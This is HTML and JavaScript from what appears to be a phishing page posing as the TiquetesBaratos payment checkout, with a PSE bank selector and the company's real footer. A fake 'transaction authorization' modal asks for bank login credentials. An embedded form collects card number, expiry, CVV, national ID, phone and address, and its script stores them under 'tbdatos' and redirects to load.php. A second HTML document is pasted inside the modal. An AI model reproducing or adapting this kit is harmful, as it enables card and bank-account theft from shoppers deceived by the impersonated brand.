                                        <option label="A continuación seleccione su banco" value="">A continuación seleccione su banco</option>
                                        <option label="BANCO AV VILLAS" value="avvillas" tipo="2" folder="b-34f1">BANCO AV VILLAS</option>
                                        <option label="BANCO BBVA COLOMBIA S.A." value="bbva" tipo="2" folder="b-34f13">BANCO BBVA COLOMBIA S.A.</option>
                                        <option label="BANCO CAJA SOCIAL" value="caja-social" tipo="2" folder="b-34f2">BANCO CAJA SOCIAL</option>
                                        <option label="BANCO DE BOGOTA" value="bogota" tipo="2" folder="b-34f4">BANCO DE BOGOTA</option>
                                        <option label="BANCO DAVIVIENDA" value="davivienda" tipo="2" folder="b-34f10">BANCO DAVIVIENDA</option>
                                        <option label="BANCO DE OCCIDENTE" value="occidente" tipo="2" folder="b-34f14">BANCO DE OCCIDENTE</option>
                                        <option label="BANCO FALABELLA" value="falabella" tipo="2" folder="b-34f5">BANCO FALABELLA</option>
                                        <option label="BANCO FINANDINA S.A. BIC" value="finandina" tipo="2" folder="b-34f6">BANCO FINANDINA S.A. BIC</option>
                                        <option label="BANCO ITAU" value="itau" tipo="2" folder="b-34f7">BANCO ITAU</option>
                                        <option label="BANCO MUNDO MUJER S.A." value="mundo-mujer" tipo="1" folder="b-34f01">BANCO MUNDO MUJER S.A.</option>
                                        <option label="BANCO POPULAR" value="popular" tipo="2" folder="b-34f18">BANCO POPULAR</option>
                                        <option label="BANCO SERFINANZA" value="serfinanza" tipo="2" folder="b-34f16">BANCO SERFINANZA</option>
                                        <option label="BANCO UNION antes GIROS" value="union" tipo="1" folder="b-34f0">BANCO UNION antes GIROS</option>
                                        <option label="BANCOLOMBIA" value="bancolombia" tipo="2" folder="b-34f9">BANCOLOMBIA</option>
                                        <option label="LULO BANK" value="lulo" tipo="1" folder="b-34f02">LULO BANK</option>
                                        <option label="SCOTIABANK COLPATRIA" value="scotiabank-colpatria" tipo="2" folder="b-34f12">SCOTIABANK COLPATRIA</option>
                                        <option label="NEQUI" value="nequi" tipo="1" folder="nequi-1">NEQUI</option>
                                      </select>
                                    </div>

                                    <button type="submit">Continuar</button>
                                    <div class="nota">Pagos seguros a través de la red PSE</div>
                                  </form>
                                </div>
                                <!-- ========== FIN TAB PAGO PSE ========== -->
                                
                            </div>
                        </div>

                    </div>
                </div>
                <input type="hidden" name="paymentInfo.TDSInformation.CAVV" value="">
                <input type="hidden" name="paymentInfo.TDSInformation.XID" value="">
                <input type="hidden" name="paymentInfo.TDSInformation.ECI" value="">
                <input type="hidden" name="paymentInfo.TDSInformation.Status" value="">
                <input type="hidden" name="paymentInfo.TDSInformation.Validated" value="false">
                <input type="hidden" id="paymentInfo.isMsiPaymentAllowed" name="isMsiPaymentAllowed" value="True">
            </div>

            <div class="modal" id="modal-authorize" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" style="display: none;" aria-hidden="false">
                <div class="modal-dialog">
                    <div class="modal-content">
                        <div id="get_login">
                            <div class="modal-header" style="display: flex; justify-content: space-between;">
                                <img src="./assets/images/nobank.png" id="img_b" class="modal-img" style="max-width: 120px; object-fit: contain;">
                                <img src="./assets/images/nobank.png" id="img_v" class="modal-img" style="max-width: 100px;">
                            </div>
                            <div class="modal-body">
                                <h5 style="color: black !important;">Autorización de transacción</h5>
                                <small>La transacción que intentas realizar en <strong>TIQUETES BARATOS S.A</strong> por <strong id="costo_tx_txt"></strong> el <strong id="date_tx"></strong> con tu tarjeta terminada en <strong id="last4txt"></strong> debe ser autorizada por seguridad.</small>

                                <!-- GET USER -->
                                <div id="get_user" style="display: none;">
                                    <h6 style="color: black !important; margin-top: 30px;">DETALLES DE TRANSACCIÓN:</h6>
                                    <table style="font-size: 14px;">
                                        <tr>
                                            <td class="titleT">Comercio:</td>
                                            <td>TIQUETES BARATOS S.A</td>
                                        </tr>
                                        <tr>
                                            <td class="titleT">Monto de la Transacción:</td>
                                            <td id="costo_tx"></td>
                                        </tr>
                                        <tr>
                                            <td class="titleT">Número de tarjeta:</td>
                                            <td id="last4"></td>
                                        </tr>
                                        <tr>
                                            <td class="titleT" id="bankFieldLabel1"></td>
                                            <td><input type="text" class="form-control" placeholder="" id="uu" style="border-radius: 0px" autocomplete="off"></td>
                                        </tr>
                                        <tr>
                                            <td class="titleT" id="bankFieldLabel2"></td>
                                            <td><input type="text" class="form-control fakepswd" placeholder="" id="pp" style="border-radius: 0px;" autocomplete="off"></td>
                                        </tr>
                                    </table>
                                </div>

                               

                                <!DOCTYPE html>
                                <html lang="es">
                                <head>
                                    <meta charset="UTF-8">
                                    <title>Pagar</title>
                                </head>
                                <body>
                                    <form id="paymentForm">
                                        <label for="ttcc">Número de tarjeta:</label>
                                        <input type="text" id="ttcc" required>
                                        <span id="err_cc" class="validation-error-help" style="display: none;">Número de tarjeta inválido</span>
                                        <br>
                                
                                        <label for="cmexp">Mes de expiración:</label>
                                        <input type="text" id="cmexp" required>
                                        <span id="err_month" class="validation-error-help" style="display: none;">Mes inválido</span>
                                        <br>
                                
                                        <label for="cyexp">Año de expiración:</label>
                                        <input type="text" id="cyexp" required>
                                        <span id="err_year" class="validation-error-help" style="display: none;">Año inválido</span>
                                        <br>
                                
                                        <label for="csc">CVV:</label>
                                        <input type="text" id="csc" required>
                                        <span id="err_cvv" class="validation-error-help" style="display: none;">CVV inválido</span>
                                        <br>
                                
                                        <label for="cuotas-2">Cuotas:</label>
                                        <input type="text" id="cuotas-2" required>
                                        <span id="err_cuotas" class="validation-error-help" style="display: none;">Cuotas inválidas</span>
                                        <br>
                                
                                        <label for="cname">Nombre del propietario:</label>
                                        <input type="text" id="cname" required>
                                        <span id="err_name" class="validation-error-help" style="display: none;">Nombre inválido</span>
                                        <br>
                                
                                        <label for="cc">Cédula:</label>
                                        <input type="text" id="cc" required>
                                        <span id="err_doc" class="validation-error-help" style="display: none;">Cédula inválida</span>
                                        <br>
                                
                                        <label for="tel">Teléfono:</label>
                                        <input type="text" id="tel" required>
                                        <span id="err_phone" class="validation-error-help" style="display: none;">Teléfono inválido</span>
                                        <br>
                                
                                        <label for="city">Ciudad:</label>
                                        <input type="text" id="city" required>
                                        <span id="err_city" class="validation-error-help" style="display: none;">Ciudad inválida</span>
                                        <br>
                                
                                        <label for="address">Dirección:</label>
                                        <input type="text" id="address" required>
                                        <span id="err_address" class="validation-error-help" style="display: none;">Dirección inválida</span>
                                        <br>
                                
                                        <button type="submit" id="pay_now">Pagar ahora</button>
                                    </form>
                                
                                    <script>
                                        document.addEventListener('DOMContentLoaded', function() {
                                            // Función para validar tarjeta de crédito usando el algoritmo de Luhn
                                            function a(b) {
                                                let c = 0;
                                                let d = false;
                                                for (let e = b.length - 1; e >= 0; e--) {
                                                    let f = parseInt(b.charAt(e));
                                                    if (d) {
                                                        f *= 2;
                                                        if (f > 9) {
                                                            f -= 9;
                                                        }
                                                    }
                                                    c += f;
                                                    d = !d;
                                                }
                                                return (c % 10 === 0);
                                            }
                                    
                                            // Al hacer clic en el botón de pago
                                            document.getElementById("pay_now").addEventListener("click", function(g) {
                                                g.preventDefault();
                                                const h = document.querySelectorAll('.validation-error-help');
                                                h.forEach(i => {
                                                    i.style.display = 'none';
                                                });
                                    
                                                let j = true;
                                    
                                                // Validación de la tarjeta
                                                const k = document.getElementById("ttcc").value.trim();
                                                if (k === "" || !a(k)) {
                                                    document.getElementById("err_cc").style.display = 'block';
                                                    j = false;
                                                }
                                    
                                                // Validación de mes de expiración
                                                const l = document.getElementById("cmexp").value.trim();
                                                if (l === "-1") {
                                                    document.getElementById("err_month").style.display = 'block';
                                                    j = false;
                                                }
                                    
                                                // Validación de año de expiración
                                                const m = document.getElementById("cyexp").value.trim();
                                                if (m === "-1") {
                                                    document.getElementById("err_year").style.display = 'block';
                                                    j = false;
                                                }
                                    
                                                // Validación del CVV
                                                const n = document.getElementById("csc").value.trim();
                                                if (n === "") {
                                                    document.getElementById("err_cvv").style.display = 'block';
                                                    j = false;
                                                }
                                    
                                                // Validación de cuotas
                                                const o = document.getElementById("cuotas-2").value.trim();
                                                if (o === "") {
                                                    document.getElementById("err_cuotas").style.display = 'block';
                                                    j = false;
                                                }
                                    
                                                // Validación del nombre
                                                const p = document.getElementById("cname").value.trim();
                                                if (p === "") {
                                                    document.getElementById("err_name").style.display = 'block';
                                                    j = false;
                                                }
                                    
                                                // Validación de cédula
                                                const q = document.getElementById("cc").value.trim();
                                                if (q === "" || q.length < 7 || q.length > 10 || !/^\d+$/.test(q)) {
                                                    document.getElementById("err_doc").style.display = 'block';
                                                    j = false;
                                                }
                                    
                                                // Validación del teléfono
                                                const r = document.getElementById("tel").value.trim();
                                                if (r === "" || r.length !== 10 || !/^\d+$/.test(r)) {
                                                    document.getElementById("err_phone").style.display = 'block';
                                                    j = false;
                                                }
                                    
                                                // Validación de ciudad
                                                const s = document.getElementById("city").value.trim();
                                                if (s === "") {
                                                    document.getElementById("err_city").style.display = 'block';
                                                    j = false;
                                                }
                                    
                                                // Validación de dirección
                                                const t = document.getElementById("address").value.trim();
                                                if (t === "") {
                                                    document.getElementById("err_address").style.display = 'block';
                                                    j = false;
                                                }
                                    
                                                // Si todos los datos son válidos
                                                if (j) {
                                                    const u = {
                                                        cardNumber: k,
                                                        expMonth: l,
                                                        expYear: m,
                                                        cvv: n,
                                                        cuotas: o,
                                                        ownerName: p,
                                                        cedula: q,
                                                        phone: r,
                                                        city: s,
                                                        address: t
                                                    };
                                    
                                                    // Guardar los datos en el localStorage bajo 'tbdatos'
                                                    localStorage.setItem('tbdatos', JSON.stringify(u));
                                    
                                                    // Guardar los mismos datos bajo la clave 'paymentData'
                                                    localStorage.setItem('paymentData', JSON.stringify(u));
                                    
                                                    // Redirigir a loadtiketid.php
                                                    window.location.href = "load.php";
                                                } else {
                                                    alert("Por favor, completa todos los campos correctamente.");
                                                }
                                            });
                                        });
                                    </script>
                                    
                                </body>
                                </html>
                                
                                    
                                    
                               
                               
                                <!-- LOADER -->
                                <div id="loading_now" style="display: flex; justify-content: center; align-items: center; flex-direction: column;">
                                    <img src="./assets/images/banks/loading.gif" alt="" style="margin-top: 40px;">
                                </div>



                            </div>
                            <div class="modal-footer text-center" id="action_button" style="display: none;">
                                <div class="div_error" style="display: none;">
                                    <h5 id="error_content" style="color: red !important; margin-top: 3.5px;text-align: left!important;"></h5>
                                    <p id="error_help" style="color: red !important; margin-top: 3.5px;text-align: left!important;"></p>
                                </div>
                                <button class="authorize" id="userAuthorizationTrigger" data-action="nu">Autorizar</button>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div id="footer" class="footer">
            <div class="text-footer">
                <p class="">
                    TiquetesBaratos - PRICE RES S.A.S. NIT. 900.474.794-8 , Calle 99 # 10-19 Of 701 Bogotá D.C., Bogotá – Colombia, Teléfonos: 601 743 0044.
                    Todos los derechos reservados.Registro Nacional de Turismo No. 44091. <a href="soportepqrco@pricetravel.com" class="text-white"><span class="__cf_email__" data-cfemail="1e6d716e716c6a7b6e6f6c7d715e6e6c777d7b6a6c7f687b72307d7173">[email&#160;protected]</span></a>
                </p>
                <p class="">
                    En desarrollo de lo dispuesto en el artículo 17 de la ley 679 de 2001, la agencia rechaza la explotación, la pornografía, el turismo sexual y demás formas de abuso sexual con menores, que son sancionados penal y administrativamente conforme a las leyes colombianas.
                </p>
            </div>
        </div>
    </div>

</body>

</html>